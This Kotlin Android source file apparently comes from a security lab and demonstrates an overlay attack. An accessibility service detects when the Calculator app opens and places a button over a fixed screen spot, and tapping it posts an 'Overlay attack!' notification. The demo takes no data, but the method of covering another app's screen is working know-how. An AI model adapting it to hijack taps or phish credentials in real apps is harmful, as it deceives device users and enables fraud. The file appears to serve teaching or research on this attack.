package com.islaboratory.overlay

import android.Manifest
import android.accessibilityservice.AccessibilityService
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.ComponentName
import android.content.Intent
import android.content.ServiceConnection
import android.content.pm.PackageManager
import android.graphics.Color
import android.graphics.PixelFormat
import android.os.Binder
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.provider.Settings
import android.util.Log
import android.view.Gravity
import android.view.View
import android.view.WindowManager
import android.view.accessibility.AccessibilityEvent
import android.widget.Button
import android.widget.FrameLayout
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.LocalActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.padding
import androidx.compose.material3.Button
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.tooling.preview.Preview
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.app.NotificationCompat
import androidx.core.app.NotificationManagerCompat
import androidx.core.content.ContextCompat
import androidx.core.graphics.toColorInt
import androidx.core.net.toUri
import com.islaboratory.overlay.ui.theme.OverlayTheme

class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        instance = this
        enableEdgeToEdge()
        setContent {
            OverlayTheme {
                DrawUI()
            }
        }
    }
    companion object {
        private var instance: MainActivity? = null
        fun grantPermissions() {
            if(Settings.canDrawOverlays(instance)) {
                Toast.makeText(instance, "Permission already granted", Toast.LENGTH_SHORT)
                    .show()
            } else {
                instance?.let { activity ->
                    val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        "package:${activity.packageName}".toUri())
                    activity.startActivity(intent)
                }
            }
        }
    }
}
class AccessibilityService : AccessibilityService() {
    override fun onCreate() {
        Log.d("Accessibility service", "Accessibility service created.")
    }

    override fun onInterrupt() {
        TODO("Will never be implemented")
    }

    private var overlayService: OverlayService? = null
    private var pendingAction: (() -> Unit)? = null
    private val connection = object : ServiceConnection {
        override fun onServiceConnected(name: ComponentName?, service: IBinder?) {
            val binder = service as? OverlayService.LocalBinder
            overlayService = binder?.getService()
            pendingAction?.invoke()
            pendingAction = null
            unbindService(this)
        }

        override fun onServiceDisconnected(name: ComponentName?) {
            overlayService = null
        }
    }

    var appLaunched = false
    var stopOverlay = false

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if(event?.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            val packageName = event.packageName?.toString()
            if(packageName == "com.google.android.calculator") {
                appLaunched = true
                stopOverlay = false
                Log.d("Accessibility service", "Calculator launched!")

                pendingAction = {
                    overlayService?.showOverlay()
                }
                val intent = Intent(this, OverlayService::class.java)
                bindService(intent, connection, BIND_AUTO_CREATE)

                Handler(Looper.getMainLooper()).postDelayed({
                    stopOverlay = true
                }, 2000)
            } else if(appLaunched && stopOverlay) {
                appLaunched = false
                Log.d("Accessibility service", "Calculator stopped!")

                pendingAction = {
                    overlayService?.hideOverlay()
                }
                val intent = Intent(this, OverlayService::class.java)
                bindService(intent, connection, BIND_AUTO_CREATE)
            }
        }
    }
}

class OverlayService : Service() {
    private lateinit var windowManager: WindowManager
    private lateinit var frameView: FrameLayout

    companion object {
        var isRunning = false
    }

    inner class LocalBinder : Binder() {
        fun getService(): OverlayService = this@OverlayService
    }

    private val binder = LocalBinder()

    override fun onBind(intent: Intent?): IBinder? = binder

    fun showOverlay() { frameView.visibility = View.VISIBLE }
    fun hideOverlay() { frameView.visibility = View.GONE }

    override fun onCreate() {
        super.onCreate()

        isRunning = true
        val channel = NotificationChannel(
            "overlay_channel",
            "Overlay Service Channel",
            NotificationManager.IMPORTANCE_LOW
        )
        val manager = getSystemService(NotificationManager::class.java)
        manager.createNotificationChannel(channel)

        val notification = NotificationCompat.Builder(this, "overlay_channel")
            .setContentTitle("Overlay Running")
            .setSmallIcon(R.drawable.ic_launcher_foreground)
            .setContentText("The overlay is running")
            .build()

        startForeground(1, notification)

        if(!Settings.canDrawOverlays(this)) {
            Toast.makeText(this, "Permission error.", Toast.LENGTH_SHORT)
                .show()
            stopSelf()
            return
        }

        windowManager = getSystemService(WINDOW_SERVICE) as WindowManager

        frameView = FrameLayout(this)
        val button = Button(this).apply {
            text = context.getString(R.string.click_overlay_button)
            textSize = 50f
            textAlignment = View.TEXT_ALIGNMENT_CENTER
            setPadding(0, 0, 0, 0)
            setBackgroundColor("#D2E2FF".toColorInt())
            setTextColor(Color.BLACK)
            background = ContextCompat.getDrawable(context, R.drawable.rounded_button)
            setOnClickListener {
                val builder = NotificationCompat.Builder(context, "overlay_channel")
                    .setSmallIcon(R.drawable.ic_launcher_foreground)
                    .setContentTitle("Overlay attack demo")
                    .setContentText(
                        "Overlay attack!"
                    )
                    .setPriority(NotificationCompat.PRIORITY_DEFAULT)

                var canSend = true
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    if (
                        ContextCompat.checkSelfPermission(
                            context,
                            Manifest.permission.POST_NOTIFICATIONS
                        ) != PackageManager.PERMISSION_GRANTED
                    ) {
                        Log.w("Notification", "Permission to post notifications not granted.")
                        canSend = false
                    }
                }
                if(canSend) {
                    NotificationManagerCompat.from(context).notify(1, builder.build())
                    Toast.makeText(
                        context,
                        "Check your notifications!",
                        Toast.LENGTH_SHORT
                    ).show()
                }
            }
        }
        frameView.addView(button)

        val layoutParams = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
            PixelFormat.TRANSLUCENT
        )

        layoutParams.gravity = Gravity.TOP or Gravity.START
        layoutParams.x = 805
        layoutParams.y = 1770
        layoutParams.width = 232
        layoutParams.height = 211

        windowManager.addView(frameView, layoutParams)
        hideOverlay()
    }

    override fun onDestroy() {
        Toast.makeText(this, "Service shutting down", Toast.LENGTH_SHORT).show()
        if(::frameView.isInitialized) windowManager.removeView(frameView)
        isRunning = false
    }
}

@Composable
fun DrawUI() {
    var runStr by remember { mutableStateOf("\uD83D\uDD34 The service isn't running") }
    val activity = LocalActivity.current
    var serviceIntent: Intent? by remember { mutableStateOf(null) }

    Box(modifier = Modifier.fillMaxSize()) {
        Column(modifier = Modifier.align(Alignment.Center)) {
            Text(
                "This app needs some permissions to work.",
                fontSize = 20.sp,
                textAlign = TextAlign.Center,
                modifier = Modifier.fillMaxWidth()
            )
            Text(
                "You might need to enable the accessibility service, then disable it and " +
                       "re-enable it.",
                textAlign = TextAlign.Center,
                modifier = Modifier
                    .padding(top = 12.dp, start = 30.dp, end = 30.dp)
                    .fillMaxWidth()
            )
            Row(
                modifier = Modifier
                    .fillMaxWidth()
                    .align(Alignment.CenterHorizontally),
                horizontalArrangement = Arrangement.Center
            ) {
                Button(
                    modifier = Modifier
                        .padding(16.dp),
                    onClick = {
                        activity?.let {
                            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
                            activity.startActivity(intent)
                        }
                    }
                ) {
                    Text("Accessibility settings")
                }
                Button(
                    onClick = { activity?.let { MainActivity.grantPermissions() } },
                    modifier = Modifier
                        .padding(16.dp)
                        .background(color = MaterialTheme.colorScheme.background)
                ) {
                    Text("Grant")
                }
            }
            Row(
                modifier = Modifier
                    .fillMaxWidth()
                    .align(Alignment.CenterHorizontally),
                horizontalArrangement = Arrangement.Center
            ) {
                Button(
                    onClick = {
                        serviceIntent = Intent(
                            activity,
                            OverlayService::class.java
                        )
                        activity?.startForegroundService(serviceIntent)
                        runStr = "\uD83D\uDFE2 Service started."
                    },
                    modifier = Modifier
                        .padding(16.dp)
                        .background(color = MaterialTheme.colorScheme.background)
                ) {
                    Text("Start service")
                }
                Button(
                    onClick = {
                        serviceIntent?.let {
                            activity?.stopService(it)
                            serviceIntent = null
                            runStr = "🔴 The service isn't running"
                        } ?: Toast.makeText(activity, "Nothing to stop!", Toast.LENGTH_SHORT).show()
                    },
                    modifier = Modifier
                        .padding(16.dp)
                        .background(color = MaterialTheme.colorScheme.background)
                ) {
                    Text("Stop service")
                }
            }
            Text(
                runStr,
                textAlign = TextAlign.Center,
                modifier = Modifier.fillMaxWidth()
            )
        }
    }
}

@Preview(showBackground = true)
@Composable
fun GreetingPreview() {
    DrawUI()
}